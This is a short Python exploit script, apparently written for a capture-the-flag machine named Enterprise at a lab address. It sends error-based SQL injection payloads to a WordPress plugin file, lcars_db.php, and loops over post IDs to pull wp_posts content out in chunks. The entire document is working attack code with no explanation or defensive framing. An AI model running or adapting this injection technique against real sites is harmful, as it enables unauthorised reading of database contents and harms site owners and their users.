# This script exploits the SQL Injection in Enterprise

import requests
import re

re_data = re.compile(r"test(.*?)test", re.DOTALL)

def getContent(post_id):
    content_num = 1
    post_num = post_id
    content = ""
    connect_and_filter = 0

    while connect_and_filter == 0:
        values = {'query' : '(select 1 from(select count(*), concat(0x74657374,(select mid(post_content,{},52) from wordpress.wp_posts limit {},1), 0x74657374, floor(rand()*5)) as a from information_schema.tables group by a)x)'.format(content_num, post_num) }

        r  = requests.get('http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php', params=values)

        if re.search('test\d', r.text):
            content += (re.findall(re_data, r.text)[0])
            connect_and_filter = 1
        else:
            try:
                content += (re.findall(re_data, r.text)[0])
            except:
                print("There was an error")
            content_num = content_num + 52
    return(content)

for x in range(1,50):
    print(x)
    print(getContent(x))
    print()
